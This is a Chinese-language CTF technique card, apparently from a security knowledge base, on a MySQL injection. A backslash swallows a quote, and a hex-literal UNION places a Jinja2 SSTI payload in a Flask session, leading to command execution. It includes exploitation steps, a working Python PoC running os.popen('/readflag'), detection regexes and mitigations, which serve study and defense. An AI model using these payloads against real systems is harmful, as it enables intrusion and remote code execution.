---
id: web-generic-sqli-backslash-quote-blacklist-hex-union-session-ssti
title: 引号黑名单 MySQL 注入：反斜杠转义闭合引号 + 十六进制字面量 UNION 写入会话用户名触发 Jinja2 SSTI
type: scenario
domain: web
path: web/generic/sqli
technique: mysql-backslash-quote-blacklist-hex-union-session-ssti
aliases:
- No Quotes
- 反斜杠注入
- 单引号黑名单绕过
- 十六进制字面量 UNION
- session user SSTI
- render_template_string session
tags:
- web
- sqli
- mysql
- backslash
- quote-bypass
- hex-literal
- union
- ssti
- jinja2
- flask
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:58:04+08:00'
  notes: '已对照原文核对：waf 仅拦单双引号、f-string 拼接 SELECT id,username、username=\ 反斜杠吞引号、password=) UNION SELECT 1,0x<hex> # 闭合与注释、session[''user'']=row[1]、/home render_template_string(... % session[''user'']) 触发 Jinja2 SSTI、lipsum.__globals__.os.popen(''/readflag'') 均与 No Quotes 1 代码/exp 一致。无 sources/source_url；技术卡无产品版本。未在本机复跑。'
---

## 一句话结论

应用只把 `'` 和 `"` 列入黑名单，却把用户名/密码直接 f-string 拼进 MySQL 查询；提交 username 为一个反斜杠 `\`，会让 `'\'` 吞掉后续的 `') AND password = ('`，password 里的 `)` 闭合原括号，再接 `UNION SELECT 1, 0x<hex>` 即可把任意字符串作为第二列返回；该字符串被存进 Flask session 的 `user`，`/home` 用 `render_template_string(... % session["user"])` 渲染时触发 Jinja2 SSTI，最终命令执行。

## 原理

- 拼接点（示例）：
  ```python
  query = ("SELECT id, username FROM users "
           f"WHERE username = ('{username}') AND password = ('{password}')")
  ```
  WAF 仅检查 `'` 与 `"`，不处理反斜杠。
- **反斜杠吞并引号**：MySQL 默认把 `\` 当作字符串转义符。username 取 `\` 时，片段变成 `username = ('\') AND password = ('...')`：`\` 转义掉紧随的 `'`，字符串继续吞入 `) AND password = (`，直到 password 开头的 `'` 才结束；password 传入 `") UNION SELECT 1, 0x... #"` 时，其首字符 `)` 闭合 `username = (...)`，随后 `UNION SELECT ...` 生效，末尾 `#` 注释掉余下内容。
- **不含引号**：UNION 里的字符串用 MySQL 十六进制字面量 `0x<hex>` 表示，避免 `'`/`"` 触发 WAF；`0x...` 在字符串上下文会按字节转换成字符串。
- **从 SQLi 到 SSTI**：查询取 `(id, username)`，`UNION SELECT 1, 0x<hex_of_ssti>` 让 `fetchone()` 返回 `(1, payload)`；登录成功把 `row[1]` 写进 `session["user"]`；`/home` 执行：
  ```python
  render_template_string(open("templates/home.html").read() % session["user"])
  ```
  `%` 字符串格式化把 session 内容插入模板后再交给 Jinja2 编译，`{{ ... }}` 被当作模板表达式执行。
- **为什么是 RCE**：Jinja2 的 `lipsum.__globals__` 暴露 `os` 模块，`os.popen()` 直接执行系统命令；`{{config}}` 还能泄露 `SECRET_KEY`。

## 触发条件

- MySQL/MariaDB 默认转义模式（未启用 `NO_BACKSLASH_ESCAPES`）。
- 注入点用单引号包裹且可 UNION，查询列数已知（示例 2 列）。
- WAF 仅过滤引号、不过滤反斜杠/十六进制/UNION；应用把查询结果写入 session 并在模板中二次渲染。
- 目标 Python/Flask 应用使用 `render_template_string` 且未对 session 值做转义。

## 利用步骤

1. 注册/访问登录页，确认 username/password 进入 SQL 拼接且引号被拦。
2. 用 `username=\`、`password=) UNION SELECT 1, 0x<hex> #` 测试列数与回显；`#` 注释剩余部分。
3. 将 SSTI payload（如 `{{ lipsum.__globals__.os.popen('/readflag').read() }}`）做 hex，放入 `0x...`。
4. 登录成功后 session 的 `user` 即为 payload；访问 `/home` 触发模板渲染，命令输出出现在页面。
5. 若登录校验还比较返回值（如 `username == row[0]`），改用 SQL Quine 卡片 `web-generic-sqli-replace-hex-self-referential-quine`。

## PoC

```python
import requests, binascii

url = "https://target/"
ssti = "{{ lipsum.__globals__.os.popen('/readflag').read() }}"
hex_payload = "0x" + binascii.hexlify(ssti.encode()).decode()

s = requests.Session()
s.post(url + "login", data={
    "username": "\\",                                  # 单个反斜杠
    "password": f") UNION SELECT 1, {hex_payload} #",
})
print(s.get(url + "home").text)
```

对应 SQL（拼接后）：

```sql
SELECT id, username FROM users
WHERE username = ('\') AND password = (') UNION SELECT 1, 0x7b7b... #
```

## 变体与关联

- **反斜杠位置**：username 末尾的反斜杠可换成其他能转义引号的字符组合；`NO_BACKSLASH_ESCAPES` 模式下失效。
- **字符串编码**：除 `0x` 外可用 `CHAR()`/`UNHEX()`，但可能引入引号或逗号限制。
- **回显校验**：如果应用比较返回行与提交值，见 `web-generic-sqli-replace-hex-self-referential-quine`（SQL Quine + SHA2 变体）。
- **SSTI 侧**：本库 `web-python-ssti-jinja2-flask-globals-rce`（Jinja2 globals RCE）、`web-python-ssti-jinja2-context-doc-get-chr-keyword-bypass`（关键字绕过）。
- **关联**：`web-generic-sqli-gbk-wide-byte-escape-bypass`（宽字节让单引号重新逃逸）是另一种“转义字符 + 引号”思路。

## 检测与防御

- **参数化查询**：所有 SQL 使用占位符/预编译，禁止 f-string 拼接；这是根因修复。
- **输入校验**：黑名单不能只列引号，应拒绝/转义反斜杠并启用 `NO_BACKSLASH_ESCAPES`（注意兼容性）；限制 UNION、十六进制字面量与注释符。
- **模板侧**：不要把用户可控值放入 `render_template_string` 的模板源；使用 `render_template` + 变量插值（自动转义），或对 session 值做严格白名单。
- **检测**：SQL 日志中出现 `username = ('\')`、`UNION SELECT 0x...`、`#` 注释；WAF 规则覆盖反斜杠结尾、`0x[0-9a-f]{10,}`、`@a:=`；监控登录后立即访问 `/home` 且响应含命令输出的模式。
